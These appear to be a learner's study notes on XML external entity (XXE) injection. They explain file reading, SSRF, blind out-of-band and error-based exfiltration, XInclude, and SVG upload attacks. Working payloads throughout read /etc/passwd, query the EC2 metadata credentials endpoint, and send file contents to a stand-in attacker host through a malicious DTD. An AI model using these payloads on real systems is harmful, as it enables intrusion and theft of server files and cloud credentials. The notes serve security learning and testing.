# xxe
# XML external entity injection

attacker can interfere with the application's XML data processing, Accessing server
file system and other back-end or external systems the application can access.

it can lead to SSRF.

## how XXE happens

XML is used to transfer data between the browser and the server. XML has some feature
that could be dangerous which are supported by it's parsers.

XML external entities are interesting because they define an entity based on external data.
[more on XML](technologies/XML.md)

## types of XXE attacks

### to get files from filesystem:

* use the defined external entity by editing the data value.
* adding a `DOCTYPE` that defense an entity with the path to the file.

vulnerable code:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>3</productId><storeId>1</storeId></stockCheck>
```

exploit:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### to perform SSRF

make the server to http request any URL that it can access.

define an external entity containing the target URL. depending on whether you could see the
response or not, it will be regular or blind SSRF attack.

exploit: figured out the next existing directory/file step by step.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
gstockCheck><productId>&xxe;</productId><storeId></storeId></stockCheck>
```

[more on EC2](technologies/EC2.md)

### blind xxe

does not return the values of any defined external entities within its responses
there are two ways of exploiting this: out-of-band techniques and informative errors

#### detection using out-of-band (OAST) techniques

like it was in XXE SSRF, but sending the request to an attacker controlled server:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

if there is an *input validation* and regular entities are blocked, try *XML parameter
entities*

Defined then used like:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

it is referred in `%xxe;`

#### Exploitation to exfiltrate data out-of-band

this malicious DTD get's `/etc/passwd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

* `file` is a parameter entity, containing the contents of `/etc/passwd`
* `eval` contains a *dynamic declaration* of a parameter entity called `exfiltrate`.
* `exfiltrate` entity will be evaluated by making a request with the contest's of `file`.

a DTD is served like this: `http://web-attacker.com/malicious.dtd`

the XXE payload to be inserted to the application:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

#### Exploiting to retrieve data via error messages

effective if the application returns the resulting error message within its response.

as before we have to add a payload in the application to request a malicious DTD file form
our server:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

#### repurposing DTD? (for later)

## Finding hidden attack surface

they are mostly obvious (requests contain XML) but in some cases you might find XXE attack
surface in requests without XML.

### XInclude attacks

some applications embed submitted data into an XML document and then parse it. a classic
attack doesn't work because you don't control the document and can't manipulate a `DOCTYPE`
element.

you could check what happens if you change the content type to XML(right-click in burp and
the rest) but it might still not accept it. but sending a request like this
`productId=%26entity%3b&storeId=2` will return an error indicating it is trying to parse it.

`XInclude` allows an XML document to be built from sub-documents. the attack can be
performed in situations where you control any item of data that is placed into a server-side
XML document. 

you need to reference the `XInclude` namespace and provide the path to the file that you
wish to include:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

* first line: declares the XML namespace for `XInclude`, which is a way to pull external
  content into an XML document.
* `<xi:include>` Element: This element tells the XML parser to include external content at
  this point in the XML document.
* `parse="text"`: Indicates that the content from the external file should be treated as
  text (not as XML).

```http
productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=2
```

### attack via file upload

DOCX and SVG are are examples of XML based formats. uploaded files might be processed or
validated on the server. 

even if the exact file type isn't what we want, the underlying processing library might
support a XML based one (PNG, but image processing library supports SVG) the attacker can
submit the malicious file to reach hidden attack surface.

SVG offers the possibility to place text into images with the tag:
see this:
https://insinuator.net/2015/03/xxe-injection-in-apache-batik-library-cve-2015-0250/

take a look at `payloadAllTheThings/XXEInjection/`

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

### XXE attacks via modified content type

if a website takes HTTP but also tolerates XML POST request, then you could reach the hidden attack surface.

# how to test for it manually

* file retrieval
* blind
* inclusion of user-supplied non-XML data

make sure you test any XML based functionality for XSS and SQLi. maybe XML encode the
payload.
